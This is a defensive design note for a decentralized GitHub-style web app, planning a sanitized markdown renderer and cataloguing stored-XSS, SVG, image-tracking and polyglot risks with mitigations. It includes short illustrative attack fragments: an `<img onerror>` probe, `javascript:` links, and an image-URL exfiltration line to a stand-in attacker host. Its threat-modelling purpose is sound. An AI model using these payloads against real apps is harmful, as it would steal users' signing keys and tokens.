# Markdown rendering like GitHub — plan and security concern

Status: CONCERN DOCUMENTED, decision pending. Do not implement the
renderer until the open decisions at the bottom are made.

## Why

The app replicates the GitHub repo view; the README card is core to it
(design objective 2). Today `miniMd` (main.js) renders a hand-rolled,
HTML-escaping subset: h1–h4, fenced code, inline code, bold, images,
links, flat bullet lists. Real-world READMEs (e.g. agregore-browser's)
already break it: HTML layout blocks (`<p align="center">`) show as
literal text, relative images (`./build/icon.png`) 404 against the Pages
origin, and tables/task lists/strikethrough don't exist.

## Planned approach (not yet approved)

Replace `miniMd` with `marked` (GFM: tables, task lists, strikethrough,
autolinks) + `DOMPurify` (GitHub-style sanitization), behind one wrapper
(`js/markdown.js`: render → sanitize → rewrite repo-relative links and
images into the embedded file set — the part gateways can't do). The same
renderer then serves the README card, `.md` blobs (rendered + Raw
toggle), issue bodies/comments, and the wiki panel.

## The security concern

Rendered markdown is the classic stored-XSS vehicle. "Like GitHub" means
allowing sanitized HTML blocks — the moment raw HTML renders,
sanitization is the only barrier between an attacker and script execution
in our origin. Inputs are genuinely untrusted:

- **The README itself** — whatever repo the app is deployed for,
  including a malicious fork's.
- **Issues/comments from the network** — signed, but signatures prove
  authorship, not safety. Any peer can sign a note carrying
  `<img onerror=…>`. Verification is identity, not moderation.
- **Fetched CIDs** — arbitrary network content.

### Blast radius specific to this app (same-origin script gets)

- `localStorage` → the Ed25519 **IPNS private keys**
  (`ipns-branch-key:<repo>`, `ipns-index-key:<repo>`): sign fraudulent
  notes, repoint the branch/index names at malicious roots.
- The **Kubo RPC bridge**: a configured Kubo at `127.0.0.1:5001` (our
  settings panel tells users to open CORS `*`) exposes the full Kubo API
  to injected JS — add/pin/remove content, read the node's repo. Near-
  total compromise of the host's node.
- **Pinning-service tokens** (`remote-pin-config`) — exfiltratable.
- The in-page Helia node: dial peers, announce bogus CIDs, poison
  gossip.

### Mitigation stack (part of "like GitHub", not optional)

1. **DOMPurify after marked**, GitHub-style config — strip scripts,
   event handlers, `style`; keep the safe whitelist (incl. `align`).
   Never `innerHTML` raw marked output. Keep DOMPurify pinned-current:
   sanitizer bypasses (incl. mXSS via SVG/MathML namespace confusion)
   are a living CVE stream, and the sanitizer must be namespace-aware.
2. **URL scheme filtering** — `javascript:`, `data:` (except possibly
   images), `vbscript:` blocked in hrefs/srcs.
3. **CSP meta tag** (works on GitHub Pages): `script-src 'self'` kills
   injected scripts and inline handlers even if sanitization misses.
   `img-src` is the enforcement layer for the image policy below.
   Prerequisite: remove the few inline `onclick=` attributes in
   index.html (the delegated-listener idiom already covers them).
4. **Image policy** — see "Image smuggling" below. DECISION NEEDED.
5. `rel="noopener"` + `target="_blank"` on rendered links (tabnabbing).
6. **Optional hard isolation**: render network-supplied content (issue
   notes, fetched docs) in `<iframe sandbox="">` without
   `allow-same-origin` — zero origin access. Costs: primer CSS injected
   into the frame, `allow-popups` for links. DECISION NEEDED.

### SVG smuggling (active content)

SVG is XML, not a passive picture — it can carry `<script>`, event
attributes (`onload`), `<a xlink:href="javascript:…">`,
`<foreignObject>` HTML, and `<animate>` attribute-mutation XSS. Context
decides everything:

- `<img src="x.svg">` (and CSS backgrounds) are script-inert — the SVG
  parses in image context. This is the ONLY safe way to render SVG.
- Inline `<svg>` in HTML, `<object>`, `<embed>`, `<iframe>`, or
  top-level navigation to an `.svg` URL = scriptable context.
- Sanitized output must therefore forbid `<object>`, `<embed>`,
  `<iframe>`, and either forbid inline `<svg>` entirely or run it
  through a namespace-aware SVG sanitizer profile (no `<script>`, no
  `<foreignObject>`, no `<animate>`, no `xlink:href`/`href` with
  executable schemes, no event attributes). A sanitizer that treats SVG
  as opaque markup gets mXSS'd.
- Repo and network content both include SVGs (icons, badges). Rule:
  render SVG via `<img>`/blob URL only, never inline; the blob view's
  image preview must not inline SVG either.

### Image smuggling (privacy + exfiltration)

- **Tracking pixels**: every remote `<img>` beacons viewer IP, user-
  agent, timing, and the page URL (which may carry `?uri=`, repo
  identity, peer info) to the image host. GitHub runs camo precisely
  because of this; we have no proxy. DECISION on the policy.
- **Gateway leakage is still leakage**: even "decentralized" loading
  tells the gateway operator which CIDs you view; loading via our own
  Helia node instead leaks to the swarm/providers. There is no
  observer-free remote image — only a choice of observer. Embedded
  (in-bundle) images leak nothing.
- **Data-URI images**: `data:image/svg+xml` is active content if it
  ever reaches a scriptable context; oversized data URIs are a memory
  knob. Restrict `data:` to raster MIME types if allowed at all.
- **Mixed content**: `http://` images on the `https://` Pages origin
  are blocked or downgrade — renderers should not emit them.
- **Exfil channel**: post-XSS, image URLs are the classic data-
  exfiltration path (`<img src="https://attacker/<stolen-data>>`) —
  CSP `img-src` limits where they can go.

### Steganography and polyglot files (payload in inert-looking media)

Sanitization works on markup, not on file bytes. A payload hidden in a
valid PNG (LSB steganography) or a **polyglot** file that is
simultaneously a valid image and valid HTML/JS passes every layer above
untouched — the image is a real image. We will NOT attempt stego
detection (statistically infeasible in-browser); the defense is
containment: repo/network bytes are never executed and never served as
documents.

- **Polyglot delivery paths to keep shut**: `blob:` URLs inherit the
  page's origin — a `blob:` URL typed `text/html` and navigated to
  top-level executes in the app's origin with full key access. Same for
  `data:` navigation and any raw-view iframe that renders bytes as a
  document. Rule: file content is rendered as escaped text or `<img>`
  (script-inert), or downloaded as an attachment — never navigated,
  never injected as HTML, never iframed as a document. GitHub isolates
  user content on a separate domain (raw.githubusercontent.com) for
  exactly this reason; we get the same guarantee by construction.
- **Exfiltration dead-drop**: post-XSS, stolen localStorage (IPNS keys,
  pin tokens) can be stego-encoded into an image and published through
  the app's own Publish tab — IPFS as the dead-drop, retrieval later by
  CID. CSP `connect-src`/`img-src` limits the destination set; the
  durable fix is key custody (non-extractable `CryptoKey` where the
  platform allows — our keys are raw bytes in localStorage today,
  extractable by design because IPNS publishing needs the raw key).
- **What this changes**: strengthens the case for the sandboxed-iframe
  option and a strict CSP — rendered content should never share an
  execution context with the keys.

## Open decisions (make these, then implement)

1. Image policy: block-by-default, gateway-proxied, or accepted leak?
   (CSP `img-src` enforces whichever is chosen.)
2. SVG policy: `<img>`-only (recommended), or inline SVG through a
   namespace-aware sanitizer profile?
3. Sandboxed iframe for network-supplied content, or sanitize + CSP only?
4. CSP meta now (requires de-inlining the `onclick=` handlers), or with
   the renderer?
5. Bundle budget approval: `marked` + `dompurify` ≈ 60 kB minified
   (noise next to Helia, but they are new runtime deps — the project
   currently renders with zero markdown deps).

## Verification plan (when approved)

- Unit: `js/markdown.js` — GFM constructs (tables, task lists,
  strikethrough), sanitization (script/onerror/style stripped, align
  kept), scheme filtering, repo-relative image/link rewriting.
- CDP: README card renders an agregore-style README (HTML block +
  relative image + table); an `<img onerror>` probe in an issue body
  does not execute.
